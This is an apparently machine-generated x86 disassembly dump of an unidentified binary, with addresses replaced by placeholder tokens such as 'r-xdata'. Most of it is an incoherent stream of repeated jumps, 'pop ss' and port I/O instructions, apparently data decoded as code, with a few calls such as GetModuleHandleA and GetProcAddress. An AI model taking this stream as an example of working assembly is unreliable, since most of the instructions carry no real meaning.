lodsb [ esi ]
int3
call 0xffffffffc6c89a00
mov fs [ ecx - 0x53 ]
sbb [ ebx + 0xaad618e ] 0xb0
or dl 0x8e
popad
cmp bl bl
js r-xdata
js r-xdata
jmp r-xdata
js r-xdata
mov eax 0x171caf00
pop ss
imul ebp [ esp ] 0x17
sub [ eax + 0x170cd601 ] ch
js r-xdata
add ah [ ebp + 0x6d ]
js r-xdata
aaa
pop ss
pop ss
js r-xdata
mov dl 0x37
adc ah 0xe2
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ebp 0x18c82da
int3
pop ss
pop ss
js r-xdata
and ah 0x47
js r-xdata
xor esp [ ebp - 0x53 ]
cmp al 0x8e
popad
popfd
arpl [ es : ebp - 0x4a9e7120 ] bx
push eax
arpl [ edx ] si
mov eax 0x618e2e63
mov ch 0x54
mov fs [ ecx - 0x43 ]
sub [ ecx ] al
pop edx
cmp edx [ edi ]
pop ss
js r-xdata
js r-xdata
out 0x5f eax
scasb [ edi ]
cld
lodsb [ gs : esi ]
fdiv st0
sub [ ecx + eax + 0x17173ed0 ] 0x78
push 0xe7e8ec97
outsb
js r-xdata
js r-xdata
adc al [ ecx ]
add [ edi ] ebx
pop ss
pop ss
js r-xdata
call 0xffffffff8f0ca391
popad
lodsd [ esi ]
js r-xdata
or al 0x17
add esi edx
js r-xdata
insd
add al bl
sbb eax 0x9011717
in eax dx
call 0xffffffff86c89887
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
add [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
mov [ edx ] al
pop ss
pop ss
adc al 0x63
lodsd [ esi ]
adc al 0xd3
lodsd [ esi ]
adc bh ah
push 0x26
sub eax 0x2d011717
arpl [ ecx + eax ] ax
or bl ch
call 0x298a20b1
pop ss
pop ss
shr [ ebp + 0x6a6ce7e4 ] cl
and eax 0xad171717

arpl [ esi - 0x1d2b7f24 ] bp
js r-xdata
imul edx [ eax ] 0xffffffe9
out 0x6d eax
adc eax 0x117172a
sbb [ edx ] ebp
pop ss
pop ss
js r-xdata
js r-xdata
sub ebx [ ecx - 0x41 ]
inc edi
js r-xdata
sub [ ecx ] al
stc
popad
movsd [ edi ] [ esi ]
js r-xdata
add al 0x69
add al 0x8c
loop r-xdata
js r-xdata
mov eax 0x1708d101
pop ss
sub [ eax + 0x17092601 ] 0x17
add eax ecx
adc al 0x17
pop ss
js r-xdata
js r-xdata
fadd [ eax - 0x4f341d2c ]
add [ esi + 0x78171710 ] ebx
js r-xdata
js r-xdata
arpl [ ebx ] bp
add [ eax + 0x78171714 ] esp
js r-xdata
arpl [ esi ] bp
mov fs [ ecx - 0x53 ]
imul eax
out 0xe8 eax
add [ 0x17173f ] edx
pop ecx
mov edi 0x1f4ae61
loopne r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] dx
add [ edi + 0x78171700 ] edx
call 0x177e78aa
pop ss
js r-xdata
js r-xdata
push esi
js r-xdata
aam 0xe2
mov ebp 0x8010463
jmp r-xdata
mov dl 0x82
lahf
mov fs [ ecx - 0x43 ]
and al 0xb2
sbb [ edx + 0x172f6401 ] 0x17
js r-xdata
pop ss
pop ss
js r-xdata
popad
scasb [ edi ]
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
jg r-xdata
add [ edi + 0x6b17171c ] ch
sub al 0xe4
pop ss
fld [ eax ]
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
insd
dec ebx
add [ 0x7817172c ] edx
js r-xdata
mov fs [ ecx - 0x53 ]
and [ edi ] dl
pop ss
js r-xdata
fldenv [ eax ]
pop ss
hlt
js r-xdata
lodsd [ esi ]
or al 0x1
push 0xffffffeb
fwait
mov fs [ ecx - 0x53 ]
or dh [ eax + 0x618eca82 ]
xchg edi eax
in al dx
call 0x5c44908c
pop ss
pop ss
imul ecx [ esp + ecx * 8 - 0x539a1734 ] 0xffffffcc
int3
and [ ebx + 0x20 ] ah
fld [ eax ]
mov fs [ ecx - 0x4b ]
pop esi
mov fs [ ecx - 0x53 ]
mov fs [ ecx - 0x5b ]
push cs
fistp [ esi ]
mov esi 0x6da4bf17
sub ah 0x65
js r-xdata
clc
fld [ eax ]
add [ ebx - 0x14 ] edi
call 0x78be9b10
out 0x6d eax
stosb [ edi ]
sub edx [ edi ]
pop ss
fld [ eax ]
add [ ebx + 0x36 ] esi
pop ss
pop ss
out 0x6c eax
pushfd
xor edx [ edi ]
clc
lodsb [ gs : esi ]
int3
add [ ebp + 0x7817175d ] eax
js r-xdata
insd
js r-xdata
mov edi 0xf0ae61
push cs
cmp [ edi ] edx
pop ss
insb
int3
scasb [ edi ]
js r-xdata
out 0x6d eax
mov fs [ ecx - 0x53 ]
sbb dh [ eax + 0x1b69b82 ]
fdivr [ esi ]
pop ss
pop ss
js r-xdata
js r-xdata
adc ebp [ ebx + 0x2e ]
loopne r-xdata
mov ebp 0x6517172a
xchg ebp eax
out 0x6d eax
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ edx ] eax
adc eax 0x2f781717
lodsd [ esi ]
adc dl cl
enter 0xcdca 0x1
mov ebx 0x7817172e
js r-xdata
pop ss
sub bh ah
insd
call 0xd8c252c
js r-xdata
pop ss
mov bh 0xb6
insd
sub [ ecx ] al
inc ebp
xor dl [ edi ]
pop ss
add [ edi - 0x24 ] 0xb8
jpo r-xdata
pop ss
pushad
mov ah 0xfd
js r-xdata
popad
push esi
cmp al 0xe8
call 0x390b2471
pop ss
pop ss
sbb [ ebx ] 0x9c
lea edi [ ebx - 0x4f519e41 ]
add bh dh
cmp [ edi ] dl
pop ss
add [ edi ] edi
sub eax 0x78781717
js r-xdata
imul ebp [ eax + edi * 8 ] 0x1
lodsb [ esi ]
adc al 0x17
pop ss
test al 0xb8
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ esi + 0xd ] eax
js r-xdata
and [ ebp + 0x65 ] ah
pop eax
adc eax 0x1a001717
push eax
pop ss
pop ss
insd
sub [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
pop ss
xchg ebp eax
mov cl 0x6d
sub [ ecx ] al
out 0x8 al
pop ss
pop ss
out 0x6c eax
or eax 0xe7171717
pop edi
stc
mov ebx 0xe8ea0301
call 0x23038397
in al 0xbb
js r-xdata
js r-xdata
lodsd [ esi ]
loopne r-xdata
sub [ edx ] 0x78781717
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
insb
int3
nop
sbb [ edi ] edx
insd
js r-xdata
movsd [ edi ] [ esi ]
in al 0x1
inc eax
inc esi
pop ss
pop ss
mov ebx 0xb401f282
add eax 0x286d1717
add [ ecx + 0x7817172a ] eax
sub dl 0x17
js r-xdata
js r-xdata
js r-xdata
pop ss
imul ebp [ ecx ] 0xffffffea
imul ebp [ edx ] 0xffffffea
add eax esp
cmp [ edi ] edx
pop ss
js r-xdata
sub dl [ edi ]
popad
movsd [ edi ] [ esi ]
or al [ eax ]
hlt
mov eax [ 0x6d17171b ]
mov fs [ ebx - 0x55 ]
pop ss
pop ss
pop ss
mov eax 0xc6ab638e
mov esi 0x13063e4
adc [ ebx + 0x17 ] edx
pop ss
js r-xdata
pop ss
imul eax [ esp + eax * 2 ] 0xbee8e8ec
add edx ebp
das
pop ss
pop ss
mov fs [ ecx - 0x43 ]
jo r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov ebx 0x447e17af
call 0x2faa0dae
mov bh 0xb6
mov bl 0x6b
sub eax 0x782b219c
js r-xdata
fist [ edi ]
js r-xdata
sbb al [ edi ]
pop ss
pop ss
cmp al 0x65
pop ss
js r-xdata
popad
xchg ebp eax
jl r-xdata
out 0x5e eax
js r-xdata
mov esi 0xf4002f63
js r-xdata
pop ss
js r-xdata
mov ebp 0x173d9f01
pop ss
js r-xdata
pop ss
pop ss
mov eax 0xc8011f63
push esp
pop ss
pop ss
js r-xdata
add al 0x15
adc [ eax + 0x17058401 ] 0x17
js r-xdata
sub esp [ ecx - 0x53 ]
adc al 0xb8
pop ss
popfd
cld
arpl [ ebp + 0x192901e0 ] bp
pop ss
pop ss
js r-xdata
adc al bl
js r-xdata
js r-xdata
js r-xdata
aas
das
add ah dh
js r-xdata
adc dl [ edi ]
push ecx
fsubr st0
call 0xffffffffe9a9b24c
js r-xdata
lodsd [ esi ]
adc al 0x1
call 0x6d5e885e
js r-xdata
int3
add al 0xb9
mov ebx 0x199201be
pop ss
pop ss
js r-xdata
das
add [ ecx ] edi
push es
js r-xdata
call 0xffffffffaa470e73
js r-xdata
js r-xdata
hlt
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pushad
loopne r-xdata
push ds
arpl [ eax ] bx
sub [ ecx ] al
cmp eax [ ecx ]
pop ss
pop ss
js r-xdata
add [ ecx + 0x6d17171b ] ah
sub al 0x17
js r-xdata
pop ss
pop ss
js r-xdata
cmp [ esi ] eax
insd
add [ edi + edx ] dl
pop ss
mov eax 0x15046d65
arpl [ eax ] dx
add [ ecx + 0x6b171738 ] dh
sub al 0xf8
add [ esp + edx - 0x4757e8e9 ] ebp
imul ebp [ eax + edx * 8 ] 0x65
js r-xdata
pop ss
mov eax 0x11cad65
call 0x17a4cf8d
js r-xdata
mov gs bx
lodsb [ esi ]
or al 0x8e
popad
lodsd [ esi ]
push cs
add [ ebx ] esi
sub eax 0xac631717
int3
pop ss
pop ss
mov cl 0xb1
add ebx esp
sbb al 0x17
pop ss
js r-xdata
mov ebx 0x184700b8
pop ss
pop ss
imul ebp [ esp ] 0xffffffbb
int 0x59
js r-xdata
arpl [ ebx ] dx
mov fs [ ecx - 0x6b ]
sub [ ebx + 0x11 ] ah
mov fs [ ecx - 0x6b ]
sub al [ ecx ]
stosb [ edi ]
pop esi
pop ss
pop ss
js r-xdata
js r-xdata
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
test al 0xe4
lodsd [ esi ]
adc al 0x1
jb r-xdata
lodsd [ esi ]
pop eax
add [ ecx ] esi
or al 0x17
pop ss
js r-xdata
insd
call 0x18aa0d5d
jle r-xdata
pop ss
js r-xdata
pop es
pop ss
pop ss
fld [ eax ]
stc
out 0x5e eax
in al dx
out 0x1 al
sub esp [ edi ]
pop ss
pop ss
add [ esi + 0x6517175c ] ah
mov ebp 0x38f80034
pop ss
cmp [ eax - 0x4793529b ] bh
shl [ ebp - 0x53 ] 0x1
js r-xdata
pop esi
stosb [ edi ]
out 0x6c eax
pop ss
sub cl [ esi - 0x4f09529f ]
add dh 0xb6
or [ ebp - 0x37529e72 ] 0x1
stosb [ edi ]
pop ecx
mov esi 0x1c882be
sub [ edi ] edx
add eax ecx
or edx [ edi ]
pop ss
add [ edi + 0x6d171725 ] al
sub bh ah
insb
jl r-xdata
and [ ebx ] ebp
js r-xdata
pop ss
movsd [ edi ] gs : [ esi ]
js r-xdata
add [ eax + edx * 2 + 0x27c31717 ] eax
mov ss bx
sbb esp edi
insd
cmp ebx [ edx ]
pop ss
pop ss
add [ esi ] ecx
xor al 0x17
pop ss
js r-xdata
sbb [ ecx ] 0xf5
sub [ eax - 0x17d3a0e9 ] 0xaa00e8e8
js r-xdata
pop ss
pop ss
out 0x6c eax
leave
das
pop ss
pop ss
arpl [ ebp - 0x440f9e08 ] bp
push 0x63e8e8e8
sbb [ ebp + 0x1e ] ch
js r-xdata
js r-xdata
adc [ eax + 0x1ea5618e ] 0x63
and [ esi - 0x4eef5a9f ] cl
mov fs [ ecx - 0x5b ]
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ ebp + edi + 0x78781717 ] ebx
js r-xdata
call 0x1768cb85
js r-xdata
inc eax
add [ ebp + 0x286d1717 ] dh
out 0x6c eax
imul eax [ edi ] 0x28db1717
pop ss
push eax
movsd [ edi ] [ esi ]
js r-xdata
popad
lodsd [ esi ]
lodsd [ esi ]
loopne r-xdata
pop ss
call 0x5ef02674
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
mov ss [ eax - 0x17 ]
call 0x179e36ef
pop ss
js r-xdata
mov fs [ ecx - 0x5b ]
push ds
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
adc [ ecx + 0x12a5618e ] dh
add ebp ecx
pop ecx
mov ebx 0xe8447e17
call 0x5446284c
pop ss
pop ss
js r-xdata
mov eax 0xb86cad65
js r-xdata
pop ss
add [ edx ] ebx
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
stc
js r-xdata
add [ eax - 0x746f6fad ] dl
rol [ ebp - 0x46ef892e ] 0x1
add [ eax ] eax
js r-xdata
add [ ebx + 0x6a ] dl
add [ edx ] ch
js r-xdata
pop ss
movsb [ edi ] [ esi ]
and dl [ edi ]
js r-xdata
lodsd [ gs : esi ]
js r-xdata
pop ss
lodsd [ gs : esi ]
pop ss
mov eax 0xe817ad2e
add [ ecx + 0x31 ] al
pop ss
pop ss
add [ edi + 0x78171740 ] ebp
js r-xdata
add al bh
js r-xdata
daa
pop ss
xor esp [ edi ]
cmc
add [ edi ] dl
pop ss
js r-xdata
add [ edx - 0x47e8e8a2 ] ch
lodsd [ gs : esi ]
sbb al 0x1
js r-xdata
add [ eax ] al
pop ebp
cmp [ 0xffffffffbf171717 ] dl
js r-xdata
js r-xdata
adc al [ ecx ]
lodsd [ esi ]
js r-xdata
xor [ eax + 0x17553a01 ] dh
pop ss
mov bl 0x21
sub edi [ eax + 0x78 ]
js r-xdata
mov ebp 0x4690463
mov eax 0xbfe8e8ea
sbb [ ebx + 0x638982b1 ] 0x29
js r-xdata
jne r-xdata
pop ecx
pop ecx
pop ebp
retn 0x4
mov ebx ecx
xor eax eax
pop ebx
retn
sub al 0xfc
insd
mov edi 0x18b561
inc edi
das
pop ss
pop ss
add [ edx ] edi
pop ss
pop ss
js r-xdata
nop
dec ebx
jne r-xdata
mov eax 0x1ebc3a75
call GetAncestor
mov ebx 0x946aa26
push 0x0
push 0x0
pop ss
js r-xdata
pop ss
jg r-xdata
cmp [ edi ] dl
js r-xdata
arpl [ ebp + 0x782b2114 ] bp
adc esp [ eax ]
pop ss
pop ss
mov ebp 0x39db0034
pop ss
pop ss
add [ 0x7817175b ] eax
js r-xdata
insb
js r-xdata
clc
add [ 0x7817170c ] edx
js r-xdata
adc eax 0xbf171717
js r-xdata
js r-xdata
mov eax 0xc882bebe
add [ esi ] edi
sub [ edi ] edx
js r-xdata
popad
lodsd [ esi ]
adc [ ecx ] al
push cs
pop ecx
pop ss
pop ss
js r-xdata
push 0x0
push 0x0
call GetAncestor
dec ebx
jne r-xdata
mov esp 0x8bd2331e
retn
js r-xdata
js r-xdata
add ebx eax
js r-xdata
mov [ rw-data ] 0xde09
nop
nop
mov ecx 0x1ebc3a75
xor edx edx
mov eax ebx
call sub_4627e0
push 0x0
nop
js r-xdata
js r-xdata
call 0x2cb20efb
test al 0x17
pop edi
sub al 0xe8
pop ss
mov eax 0x17443200
pop ss
add [ esi + edx * 2 + 0x618e1717 ] edx
lodsd [ esi ]
xor al 0xb0
add [ edi + 0x1720d901 ] 0x17
js r-xdata
insd
sub al 0x14
pop ss
pop ss
mov eax 0x12546d65
pop ss
nop
pop ebx
retn
cmp bh [ esi + ebx - 0x6016018 ]
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl cx bp
arpl [ ecx + ebp * 2 ] ax
add al 0xb8
0x82bfe8e8 0xb19b
mov fs [ ecx - 0x53 ]
mov cl 0x82
mov [ ebx + 0x29 ] esp
mov fs [ ecx - 0x4b ]
or [ ecx ] al
test [ eax + 0x17 ] dl
pop ss
retn
push 0x0
call sub_45cdd8
nop
pop ebx
retn
js r-xdata
imul edx [ ecx ] 0xffffffb4
js r-xdata
mov [ ebx ] 0x9a
inc ecx
dec edx
jne r-xdata
js r-xdata
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
push ds
js r-xdata
cld
js r-xdata
mov edi 0xc1501f8
pop ss
pop ss
js r-xdata
js r-xdata
add cl cl
push es
pop ss
pop ss
mov esi 0x17556d01
pop ss
js r-xdata
js r-xdata
sub al 0xd8
js r-xdata
pop ss
mov ah 0x1
js r-xdata
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
enter 0xaa01 0x59
in al dx
jmp 0xffffffffa448106a
lahf
js r-xdata
jne r-xdata
js r-xdata
sub [ ecx ] al
xchg edi eax
test [ eax + 0x17 ] dl
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
pop es
pop ss
js r-xdata
xor [ eax + 0x17 ] ebx
js r-xdata
xor [ esi + 0x63bcb561 ] cl
xor [ esi + 0x63beb561 ] ecx
xor [ esi - 0x244f4a9f ] cl
xor eax [ ecx ]
int1
js r-xdata
dec [ ebx + 0x75db85d8 ]
add al 0x90
stc
[ eax - 0x78 ]
mov esp 0xfe9fe81e
js r-xdata
pop ss
js r-xdata
js r-xdata
push 0x0
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call GetAncestor
mov eax ebx
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov ebx 0xb85b
js r-xdata
call 0xffffffffea2ea825
call 0x182eaa2a
cmp esp [ ebx + 0x18 ]
pop ss
add [ ecx ] edx
cmp [ edi ] dl
pop ss
js r-xdata
insb
aas
add [ edi ] dl
js r-xdata
mov gs [ ebx + 0x11 ]
js r-xdata
js r-xdata
cmp al 0xfa
js r-xdata
adc [ ecx + eax + 0x171726f1 ] esi
js r-xdata
js r-xdata
dec [ ebx - 0x174173d ]
js r-xdata
add ecx esi
js r-xdata
add dh 0x8e
popad
lodsd [ esi ]
cli
mov al 0x82
sahf
mov fs [ ecx - 0x53 ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
add esi ecx
sbb eax 0x82781717
nop
retn
js r-xdata
js r-xdata
mov edi esi
js r-xdata
add [ ebp + 0x78171722 ] eax
js r-xdata
call 0xffffffff812f1013
call 0xffffffff832f1029
call 0x18a9625c
sub_4608d8
js r-xdata
js r-xdata
mov al 0x1
jl r-xdata
js r-xdata
jpe r-xdata
call 0xffffffff82f681cb
test [ esi - 0x4f0d529f ] ecx
add [ esi - 0xb529e72 ] 0x1
or edx [ edi ]
jne r-xdata
mov ss bx
jmp 0xffffffffe93e805e
js r-xdata
pop ss
pop ss
lodsd [ gs : esi ]
sbb [ ecx ] al
xor esi 0xffffffe8
call 0x722d316d
sub [ ecx ] eax
pop ebp
out 0xe8 al
call 0x28b38182
add eax edi
or dl [ edi ]
pop ss
js r-xdata
pop edi
sub al 0xe8
call 0x39d80b3c
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
js r-xdata
add [ esi ] edx
call 0xffffffff8ebe82da
popad
pop ss
imul ebp [ esp + edi * 8 ] 0x1
pop ss
call 0xffffffff9246f33b
cmp [ edi ] edx
pop ss
js r-xdata
shl [ ebp + 0x263d01e4 ] 0x1
pop ss
loope r-xdata
cld
add [ edi ] edx
mov fs [ ecx - 0x53 ]
cmp al 0xb0
in al 0x1
js r-xdata
mov fs [ ecx - 0x6b ]
js r-xdata
js r-xdata
xchg ebp eax
sbb cl [ esi + 0x63d6bd61 ]
adc [ ebx + 0x38 ] ah
mov fs [ ecx - 0x4b ]
or cl [ esi - 0x24e36a9f ]
pop ss
mov fs [ ecx - 0x43 ]
test al 0x63
xor bl bl
cmp al [ edx - 0x4a9e7161 ]
js r-xdata
js r-xdata
cld
call 0x78be82a9
js r-xdata
pop ss
js r-xdata
add [ 0x6be8e8e2 ] ch
sub al 0xe4
or al 0x8e
js r-xdata
cmp [ eax ] edi
js r-xdata
fwait
add [ ecx ] edi
js r-xdata
lea edx [ eax + ebp * 8 ]
movsd [ edi ] gs : [ esi ]
adc al 0xb9
adc [ edx - 0x71e99c42 ] al
popad
xchg ebp eax
adc bl bl
pop ss
popad
xchg ebp eax
add [ edi + 0x1f ] ebp
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
js r-xdata
js r-xdata
popad
mov ebp 0xb23163aa
mov fs [ ecx - 0x4b ]
push cs
js r-xdata
pop ss
js r-xdata
add [ ebp + 0xb ] esi
js r-xdata
cmp [ edi ] dl
js r-xdata
sbb dl [ edi ]
call 0xffffffff9b468219
js r-xdata
add [ ecx ] ch
lodsd [ esi ]
adc al 0x50
call 0xffffffffe82ef481
dec edx
add [ ecx + 0x2d ] esi
pop ss
pop ss
js r-xdata
xor al 0xb0
sbb [ esi + 0x618e1063 ] 0x95
arpl [ ss : esi ] dx
mov fs [ ecx - 0x6b ]
or bl bl
pop ss
add edi edi
cmp [ edi ] dl
pop ss
js r-xdata
insb
xor al 0xe4
call 0x31770d24
pop ss
pop ss
js r-xdata
xor ah [ ebx + 0x2e ]
mov fs [ ecx - 0x53 ]
lodsd [ esi ]
mov cl 0x6d
sub bh ah
insb
mov ebp edi
call 0xfc50c90
pop ss
pop ss
out 0x6d eax
in eax 0x32
pop ss
pop ss
xchg ebp eax
push eax
pop eax
adc eax 0x42001717
pop eax
js r-xdata
pop ss
js r-xdata
insd
xor ebp eax
call 0x7cf36fb5
add [ edi + 0x78e8e8f9 ] edi
js r-xdata
stosb [ edi ]
arpl [ ecx ] si
mov dl 0x8e
popad
mov ch 0xe
js r-xdata
mov fs [ ecx - 0x6b ]
adc al 0xb7
sub [ edx - 0x171c6eff ] 0xe8
fist [ edi ]
popad
lodsd [ esi ]
jne r-xdata
popad
lodsd [ esi ]
mov al 0x82
xchg [ esi + 0x1f4ad61 ] cl
shr ecx cl
add [ edi - 0x8 ] esi
push ds
add edi edx
aas
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
js r-xdata
mov eax 0x173b7101
js r-xdata
and eax esp
call 0x78be84a7
js r-xdata
insb
int3
jbe r-xdata
out 0x66 eax
jmp r-xdata
pop ss
insd
sub bh ah
insd
pop ds
xor [ edi ] edx
pop ss
xchg ebp eax
add [ ebp + 0x65 ] ah
pop eax
pop ss
js r-xdata
lea ebp [ edi ]
js r-xdata
xor [ edx + 0xeb5618e ] esi
js r-xdata
lodsd [ esi ]
xor al 0x86
mov esi 0x5900a5a5
add [ edi ] edx
pop ss
mov bh 0xb6
add [ ebp + 0x78171703 ] ebp
js r-xdata
lodsd [ esi ]
add al 0xa5
js r-xdata
mov gs [ ebp + 0x3a ]
add [ ebx + 0x78171715 ] esi
js r-xdata
js r-xdata
pop ss
js r-xdata
js r-xdata
jno r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sbb [ esi + ecx * 4 - 0x4ffb529f ] 0x82
or [ esi - 0x4ff9529f ] 0xbe018e82
xor [ edi ] edx
pop ss
js r-xdata
call 0xffffffffb046f445
add [ edi ] dl
pop ss
xor [ edx - 0x40fa48f9 ] 0x61
scasb [ edi ]
adc eax 0x7c001717
cmp [ edi ] dl
pop ss
add [ edi - 0x1 ] ebp
call 0x78be83c4
js r-xdata
pop eax
add [ edx + 0x38 ] al
js r-xdata
js r-xdata
js r-xdata
mov [ 0xffffffffad2fa5be ] eax
movsd [ edi ] [ esi ]
js r-xdata
mov fs [ ecx - 0x53 ]
pushfd
js r-xdata
pop ss
imul ecx [ ebp - 0x5a9a17ec ] 0x14
mov ecx 0xe8f94201
call 0x78be812b
js r-xdata
insb
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb edx [ edi ]
pop ss
add esp ebp
pop ss
pop ss
js r-xdata
pop ss
add [ edi ] edi
js r-xdata
movhps [ edi ] xmm2
mov esi 0x17097d01
pop ss
pop ss
mov edi 0x17106b8c
out 0x6c eax
0x1e8e8e0 0x2452
sar [ eax - 0x18171753 ] 0x1
js r-xdata
call 0xffffffff80fef431
in al dx
jmp 0x4347f437
js r-xdata
pushfd
mov fs [ ecx - 0x53 ]
add al 0xb0
add [ ecx + 0x6ad618e ] 0xb0
or [ esi + 0x1731be01 ] 0x17
js r-xdata
cmp [ edi ] dl
pop ss
js r-xdata
xor eax 0x78781717
js r-xdata
cdq
movsd [ edi ] [ esi ]
mov al 0x8d
das
mov esi 0x3cad2fa5
mov al 0x8d
xchg [ esi - 0x5acf52d1 ] bh
js r-xdata
fld [ eax ]
popad
lodsd [ esi ]
add [ edi + 0x1b ] esp
pop ss
pop ss
add esi edx
call 0x1ae109aa
pop ss
js r-xdata
add [ edx - 0x7 ] eax
call 0x78be819a
js r-xdata
call 0xffffffffb95aae0f
call 0x4e320aa
arpl [ edi ] bp
add [ esi + esi * 8 - 0x18 ] bh
call 0x2f1d0a7e
pop ss
pop ss
js r-xdata
mov esi 0x61bbd858
js r-xdata
js r-xdata
js r-xdata
js r-xdata
imul ebp [ eax + edx * 8 ] 0x1
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
loopne r-xdata
add dl [ edi ]
aas
js r-xdata
mov eax 0x1700a200
pop ss
and [ ebp + 0x1baf7fa ] 0xa4
add edx [ edi ]
pop ss
js r-xdata
popad
movsd [ edi ] [ esi ]
sbb dh [ ecx + 0x618ec682 ]
movsd [ edi ] [ esi ]
sbb al 0xb1
add [ esi ] ecx
0xbe84d5
jb r-xdata
movhps [ edi ] xmm2
js r-xdata
inc edx
js r-xdata
cmp al 0xb0
lea eax [ esi + 0x30ad2fbe ]
movsd [ edi ] [ esi ]
das
lodsd [ esi ]
js r-xdata
xor [ eax - 0x66fe7a7e ] dh
lodsd [ esi ]
js r-xdata
stc
call 0x14fb6b24
add [ esi - 0x1d ] ch
call 0xffffffffe472752c
mov ebx 0xbf17ea82
add [ ebx + 0x117171a ] bl
salc
js r-xdata
in al 0x63
js r-xdata
call 0xffffffffadabf6a9
sub [ eax + 0x15b46d65 ] bh
call 0xf390e83
fdivr [ ebx - 0x17fb919f ]
js r-xdata
js r-xdata
pop eax
js r-xdata
js r-xdata
js r-xdata
pop ss
lodsd [ esi ]
sub [ eax - 0x17ff80e9 ] bh
js r-xdata
sbb edx [ edi ]
pop ss
js r-xdata
in eax 0x1b
pop ss
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
mov cl 0xb1
movsd [ edi ] gs : [ esi ]
xor [ ecx - 0x3fe577e ] bh
pop ss
pop ss
mov eax 0x170f2900
pop ss
popad
mov ch 0x30
pop ss
popfd
sbb [ edi + 0x173ce900 ] bh
pop ss
pop ss
xor [ edi ] edx
pop ss
js r-xdata
mov al 0x1
push ss
call 0x78be8249
js r-xdata
mov ebx 0x1b8bf17
adc al 0x17
mov al 0x82
js r-xdata
jecxz r-xdata
out 0x6c eax
xor [ ecx ] al
js r-xdata
loopne r-xdata
adc edx ebx
out 0x6d eax
das
pop ds
pop ss
pop ss
arpl [ eax - 0x1801fe20 ] sp
call 0x6a47bee2
pop ss
pop ss
pop ss
jle r-xdata
outsb
popad
js r-xdata
mov bl 0x2b
js r-xdata
mov ebx 0xe8046e61
js r-xdata
js r-xdata
out dx al
call 0x78be849a
mov eax [ 0x78e8e8ee ]
js r-xdata
call 0x28f373aa
mov eax 0x15b46d65
mov eax 0xe8007f17
mov bl 0x8e
popad
mov ch 0x16
add [ ebp - 0x4a9e714d ] 0xe8
add [ esi + 0x618e3263 ] 0xb5
0xb5618eb3 0x82ec
mov ch 0xea
mov bl 0x8e
popad
mov ch 0xec
sbb dh 0xb3
add ecx ecx
daa
pop ss
pop ss
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl ax bp
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
insd
sub bh ah
insb
js r-xdata
js r-xdata
js r-xdata
test [ ecx ] eax
js r-xdata
sti
adc eax 0x78781717
js r-xdata
jecxz r-xdata
mov eax 0xe7286dcc
insb
inc edx
jmp r-xdata
arpl [ ebp - 0x3347e820 ] bp
insd
sub bh ah
call 0x28b3f6ed
add ebp edx
or [ edi ] edx
pop ss
js r-xdata
add al 0xe8
js r-xdata
pop ss
js r-xdata
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
popfd
or [ ecx ] al
cmp eax 0x78781717
js r-xdata
out dx al
pop es
pop ss
pop ss
add [ ecx ] esp
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
lea ecx [ edx ]
out 0x6c eax
js r-xdata
jg r-xdata
pop ss
js r-xdata
pop ss
insb
xlat
xor edx [ edi ]
pop ss
add [ edx ] edi
das
insd
cmp al [ ecx ]
mov bl 0x15
pop ss
pop ss
js r-xdata
insb
mov edx 0xe717173e
pop edi
0x17172401 0x7817
pop ss
pop ss
js r-xdata
lodsd [ gs : esi ]
pop ss
pop ss
js r-xdata
js r-xdata
push esp
mov eax 0xe8f92401
call 0x7c47b71c
add dl [ edi ]
mov cl 0x6d
sub bh ah
insd
or eax 0x65e8e8f9
lodsd [ esi ]
js r-xdata
js r-xdata
call 0x4247f611
or [ edi ] dl
js r-xdata
pop ss
pop ss
or dh 0x8b
cmp [ edi - 0x45 ] 0x61
outsb
add al ch
call 0xf280e94
pop ss
pop ss
add [ esi + 0x78171737 ] edi
mov eax 0xb828ad65
pop ss
jg r-xdata
call 0xfffffffff346f682
push cs
js r-xdata
pop ss
mov eax 0x65e09d17
lodsd [ esi ]
cmp al 0x1
xchg esi eax
add eax 0x3c011717
sub eax 0x6ce71717
xor [ ebp + 0x33 ] ch
out 0x6c eax
dec esp
aaa
pop ss
pop ss
add bh 0xb1
or eax 0x7661bb76
cmp al ch
call 0xf170e65
pop ss
pop ss
sbb [ ecx - 0x4427a742 ] 0x61
out dx al
add ah al
push cs
pop ss
pop ss
add [ ebx - 0x4427a742 ] 0x61
js r-xdata
